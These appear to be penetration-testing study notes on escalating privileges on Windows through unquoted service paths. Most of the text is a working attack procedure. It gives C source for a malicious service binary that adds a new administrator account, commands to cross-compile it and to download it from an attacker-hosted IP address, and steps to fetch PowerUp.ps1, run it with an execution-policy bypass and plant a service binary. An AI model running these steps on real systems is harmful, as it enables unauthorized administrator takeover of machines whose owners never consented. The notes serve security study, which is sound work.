- Works when we have write-permissions to a service's main- or sub-directories but cannot replace files within them.
- Services are started with 'CreateProcess' and the parameter 'IpApplicationName'. If the path that follows that parameter contains one or more spaces and is not enclosed within quotes it may be abused for a privesc.
- Paths are read from left to right, and for every space all preceding words are interpreted as executables, and the rest as arguments. Example:
```
C:\Program Files\My Program\My Service\service.exe
---------------------------------------------------
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
- Therefore if that happens an executable with one of those name can be placed an used to privesc.

### Unquoted Service Path Service Privesc:
1. Enumerate running services for misconfigured paths (only works in cmd):
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
2. Check for write access rights in the service's butchered search order swith 'icacls'.
3. Create malicious binary. Example in C which will create a new user:
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
4. Cross-compile it to an 64-bit .exe for Windows:
```bash
x86_64-w64-mingw32-gcc <file>.c -o <file>.exe
```
5. Serve the binary, download it, and move it to the correct directory:
```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move <pre-path> <post-path>
```
6. Restart the service -- win!
-------------------------

### Automatic Unquoted Service Path Privesc with PowerUp:
1. Serve the PowerUp.ps1 on your kali machine.
2. Download the script:
```powershell
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```
4. Run the script with bypass:
```
 powershell -ep bypass
 . .\PowerUp.ps1
```
5. Now check for vulerable paths:
```
Get-UnquotedService
```
6. Try to use the built-in AbuseFunction to install a service binary (where name is Service Name listed from above command):
```powershell
Write-ServiceBinary -Name '<servicename>' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
7. Win!
